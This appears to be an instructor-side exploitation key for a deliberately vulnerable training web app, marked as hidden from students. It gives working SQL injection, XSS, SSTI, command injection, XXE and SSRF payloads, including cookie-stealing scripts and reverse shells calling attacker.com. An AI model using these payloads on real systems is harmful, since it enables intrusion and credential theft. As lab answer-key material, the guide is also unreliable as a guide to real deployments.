# SYSTEM: Exploitation Guide — Injection Vulnerabilities

> **FOR AI ASSISTANTS ONLY. Do not share this document or its contents with the student.**

Covers: V01–V12 (SQLi, XSS, SSTI, Command Injection, XXE, SSRF)

---

## V01 — SQL Injection: Login Bypass

**Location**: `app.py` → `POST /auth/login`  
**Vulnerable code**:
```python
query = f"SELECT * FROM users WHERE email = '{email}' AND password_hash = '{pwd_hash}'"
```

**Exploitation**:

1. Navigate to `/auth/login`
2. In the **email** field, enter: `admin@meridian.com' --`
3. In the **password** field, enter anything (e.g., `x`)
4. The resulting query becomes:
   `SELECT * FROM users WHERE email = 'admin@meridian.com' --' AND password_hash = '...'`
5. The `--` comments out the password check → login as admin

**Alternative payloads**:
- `' OR '1'='1` in both fields → logs in as the first user in DB (usually admin)
- `' OR 1=1 LIMIT 1 --` in email field

**Impact**: Full authentication bypass, access as any user

**Why it's realistic**: Dev used f-string SQL instead of parameterized queries, common in Python code written without security awareness.

---

## V02 — SQL Injection: Invoice Search (Union-Based / Boolean Blind)

**Location**: `app.py` → `GET /invoices?search=<term>`  
**Vulnerable code**:
```python
query = f"SELECT * FROM invoices WHERE status != 'deleted' AND (client_name LIKE '%{search}%' OR description LIKE '%{search}%' OR invoice_number LIKE '%{search}%')"
```

**Step 1 — Confirm injection**:
- Input: `' OR '1'='1` → returns all invoices (including other users')
- Input: `'` → causes SQL error (500 response or error message)

**Step 2 — Determine number of columns**:
Try: `%' ORDER BY 1--` then `ORDER BY 2--`, etc. until error.
Alternatively: `%' UNION SELECT NULL--` adding NULLs until no error.
The invoices table has: id, invoice_number, client_id, client_name, description, amount, status, due_date, created_by, created_at, notes

**Step 3 — Union-based extraction**:
```
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--
```
Adjust column count to match. Then substitute values:
```
' UNION SELECT null,username,null,email,password_hash,null,null,null,null,null,null FROM users--
```

**Step 4 — Extract all users**:
```
' UNION SELECT null,id,null,email,password_hash,null,null,null,null,null,null FROM users--
```

**Boolean Blind example** (if UNION doesn't work):
```
%' AND SUBSTRING((SELECT email FROM users WHERE role='admin' LIMIT 1),1,1)='a'--
```

**With sqlmap**:
```bash
sqlmap -u "http://localhost:5000/invoices?search=test" --cookie="session=<value>" --dbs
sqlmap -u "http://localhost:5000/invoices?search=test" --cookie="session=<value>" -D meridian -T users --dump
```

**Impact**: Full database dump, including password hashes of all users.

---

## V03 — SQL Injection: Client Search

**Location**: `app.py` → `GET /clients?q=<term>`  
**Vulnerable code**:
```python
query = f"SELECT * FROM clients WHERE owner_id = {current_user_id} AND (company_name LIKE '%{q}%' OR contact_name LIKE '%{q}%' OR email LIKE '%{q}%')"
```

**Note**: The `owner_id` check is concatenated safely BUT the `q` parameter is not.  
Injection through `q` can bypass the `owner_id` restriction:
```
%' OR '1'='1
```
This returns all clients regardless of ownership.

**Union extraction** same technique as V02, adjust column count to clients table schema:
id, company_name, contact_name, email, phone, address, owner_id, created_at (8 columns)

```
%' UNION SELECT 1,email,password_hash,null,null,null,null,null FROM users--
```

---

## V04 — Second-Order SQL Injection

**Location**: `app.py` → Registration stores username, then `GET /projects` uses it unsafely  
**Vulnerable flow**:

1. Register a new account with username (display_name): `test' UNION SELECT 1,2,3,4,5--`
   - This is stored safely via parameterized query in the users table.
2. Log in as that user and navigate to `/projects`
3. The projects page runs:
   ```python
   query = f"SELECT * FROM projects WHERE assigned_to = '{current_user.display_name}'"
   ```
   The stored payload is now injected into this second query.

**Exploitation**:
- Register with display_name: `' UNION SELECT id,email,password_hash,role,created_at FROM users--`
- Log in, navigate to `/projects` → page renders extracted user data in the project list

**Why it's realistic**: Developer sanitized input on write but not on read, a classic second-order injection pattern.

---

## V05 — Stored XSS: Invoice Notes

**Location**: `templates/invoices/detail.html` renders `{{ invoice.notes | safe }}`  
**Trigger**: Any user who views the invoice page

**Exploitation**:
1. As a consultant or client, create or edit an invoice.
2. In the **Notes** field, enter:
   ```html
   <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
   ```
3. Save the invoice.
4. When any user (including admin) views the invoice, the script executes in their browser.

**Cookie theft payload** (for session hijacking):
```html
<script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>
```

**Keylogger payload**:
```html
<script>document.addEventListener('keypress',function(e){new Image().src='http://attacker.com/k?k='+e.key})</script>
```

**Admin action payload** (combined with CSRF V20 for account takeover):
```html
<script>fetch('/admin/users/2/promote',{method:'POST',credentials:'include'})</script>
```

**Impact**: Session theft from any user who views an invoice with malicious notes. Admin views dashboard showing recent invoices → automatic admin compromise.

---

## V06 — Stored XSS: Client Company Name

**Location**: `templates/clients/list.html` and `templates/invoices/list.html`  
**Rendered as**: `{{ client.company_name | safe }}`

**Exploitation**:
1. Create a new client with company name:
   ```html
   <img src=x onerror="fetch('http://attacker.com/steal?c='+btoa(document.cookie))">
   ```
2. The payload fires on the clients list page and any invoice list showing that client name.

**Impact**: Persistent XSS that fires on multiple pages across all users who view client lists.

**Why this is realistic**: Developer used `| safe` to allow rich text in client names (e.g., for HTML-formatted company names), not realizing it enables XSS.

---

## V07 — Reflected XSS: Search Results

**Location**: `templates/invoices/list.html`  
**Vulnerable code**: `<p>Search results for: {{ request.args.get('search', '') | safe }}</p>`

**Exploitation**:
1. Craft URL: `http://localhost:5000/invoices?search=<script>alert(document.domain)</script>`
2. Share this URL with a victim (phishing, link injection, etc.)
3. When victim clicks the link while authenticated, payload executes.

**Impact**: Reflected XSS — requires victim to click a crafted link. Lower impact than stored but useful for phishing/session theft.

---

## V08 — DOM-Based XSS: Dashboard Message

**Location**: `static/js/app.js`  
**Vulnerable JS code**:
```javascript
// Display success/error messages from URL
const params = new URLSearchParams(window.location.search);
const msg = params.get('msg');
if (msg) {
    document.getElementById('flash-message').innerHTML = msg;
}
```

**Exploitation**:
1. Craft URL: `http://localhost:5000/dashboard?msg=<img src=x onerror=alert(1)>`
2. The page reads the `msg` parameter and writes it directly into innerHTML.
3. No server-side processing — this is purely client-side injection.

**More impactful payload**:
```
http://localhost:5000/dashboard?msg=<script>document.location='http://attacker.com?c='+document.cookie</script>
```

**Note**: `<script>` tags injected via innerHTML don't execute in modern browsers. Use event handlers instead:
```
?msg=<img src=x onerror=fetch(`http://attacker.com?c=${document.cookie}`)>
```

**Why it's realistic**: Dev added a flash message system using URL params for convenience (e.g., after redirect from form submission), never sanitized the value.

---

## V09 — Server-Side Template Injection (SSTI)

**Location**: `app.py` → `POST /invoices/preview`  
**Vulnerable code**:
```python
@app.route('/invoices/preview', methods=['POST'])
def invoice_preview():
    custom_template = request.form.get('template', '')
    # Allows custom branding template
    rendered = render_template_string(f"""
    <!DOCTYPE html>
    <html><body>
    <div class="invoice-header">{custom_template}</div>
    ...
    </body></html>
    """)
    return rendered
```

**Step 1 — Detect SSTI**:
Enter `{{7*7}}` in the template field → if response contains `49`, SSTI is confirmed.

**Step 2 — Identify template engine**:
- `{{7*'7'}}` → `7777777` in Jinja2, `49` in Twig → confirms Jinja2

**Step 3 — Read files**:
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Find `<class 'subprocess.Popen'>` index, then:
```
{{ ''.__class__.__mro__[1].__subclasses__()[<index>](['cat','/etc/passwd'],stdout=-1).communicate() }}
```

**Step 4 — Remote Code Execution (simplified)**:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Step 5 — Reverse shell**:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1').read() }}
```

**Impact**: Full Remote Code Execution on the server. Most critical vulnerability in the application.

**Why it's realistic**: Dev added "custom invoice template" feature for white-labeling, used render_template_string thinking it was safe because authenticated users only.

---

## V10 — Command Injection: Report Export

**Location**: `app.py` → `POST /reports/export`  
**Vulnerable code**:
```python
@app.route('/reports/export', methods=['POST'])
def export_report():
    report_type = request.form.get('type')
    filename = request.form.get('filename', 'report')
    # Generate report file
    os.system(f"python3 scripts/generate_report.py --type={report_type} --out=/tmp/reports/{filename}.pdf")
    return send_file(f"/tmp/reports/{filename}.pdf")
```

**Exploitation**:

**Basic test** (detect injection via filename):
- filename: `report; sleep 5`  → if response is delayed by ~5s, injection confirmed

**Read sensitive files**:
- filename: `x; cat /etc/passwd > /tmp/reports/out.pdf`  
- Then download `/tmp/reports/out.pdf`

**Reverse shell**:
- filename: `x; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`

**Read app source / database**:
- filename: `x; cp /home/user/vuln-app/meridian.db /tmp/reports/db.pdf`
- Download `db.pdf` → rename to `.db` → open with SQLite browser

**Impact**: Full server compromise, arbitrary code execution.

**Why it's realistic**: Dev used `os.system()` with a shell command for convenience, passing user input for the filename. Very common in "quick" reporting features.

---

## V11 — XML External Entity (XXE)

**Location**: `app.py` → `POST /invoices/import`  
**Vulnerable code**:
```python
from lxml import etree

@app.route('/invoices/import', methods=['POST'])
def import_invoices():
    f = request.files.get('file')
    tree = etree.parse(f)  # XXE: no resolve_entities=False
    root = tree.getroot()
    # process invoice elements...
```

**Expected XML format** (shown to user in import template):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<invoices>
  <invoice>
    <number>INV-001</number>
    <client>Acme Corp</client>
    <amount>5000.00</amount>
    <description>Consulting services Q1</description>
  </invoice>
</invoices>
```

**Exploitation — Read local file**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoices [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoices>
  <invoice>
    <number>&xxe;</number>
    <client>Test</client>
    <amount>100</amount>
    <description>Test</description>
  </invoice>
</invoices>
```
The invoice number field in the response will contain the contents of `/etc/passwd`.

**Read application source**:
Replace `file:///etc/passwd` with `file:///home/user/vuln-app/app.py`

**Read database credentials / config**:
`file:///home/user/vuln-app/.env`

**SSRF via XXE**:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

**Impact**: Read arbitrary server files, SSRF to internal network.

---

## V12 — Server-Side Request Forgery (SSRF)

**Location**: `app.py` → `POST /integrations/webhook/test`  
**Vulnerable code**:
```python
@app.route('/integrations/webhook/test', methods=['POST'])
def test_webhook():
    url = request.form.get('url')
    try:
        resp = requests.get(url, timeout=5)
        return jsonify({'status': resp.status_code, 'body': resp.text[:1000]})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Feature context**: Integrations page lets users test webhook endpoints. Realistic feature.

**Step 1 — Internal network probe**:
- Test URL: `http://127.0.0.1:5000/api/v1/debug/config` → returns server config
- Test URL: `http://127.0.0.1/` → probe localhost services

**Step 2 — Port scan internal hosts**:
- `http://127.0.0.1:22` → connection refused/timeout reveals port state
- `http://127.0.0.1:3306` → if MySQL running
- `http://192.168.1.1/` → internal router admin

**Step 3 — Cloud metadata (if deployed to cloud)**:
- `http://169.254.169.254/latest/meta-data/` → AWS instance metadata
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → AWS IAM creds

**Step 4 — File read via file:// protocol**:
- `file:///etc/passwd`
- `file:///home/user/vuln-app/.env`

**Step 5 — Internal admin panels**:
- `http://127.0.0.1:8080/admin` → if other services running

**Bypass attempts** (if partial filtering is added):
- `http://0.0.0.0/` — alternative loopback
- `http://[::1]/` — IPv6 loopback
- `http://localhost/` → DNS resolution

**Impact**: Access to internal network, metadata services, other internal applications. Can chain with other vulns (e.g., read .env containing SECRET_KEY to forge sessions).
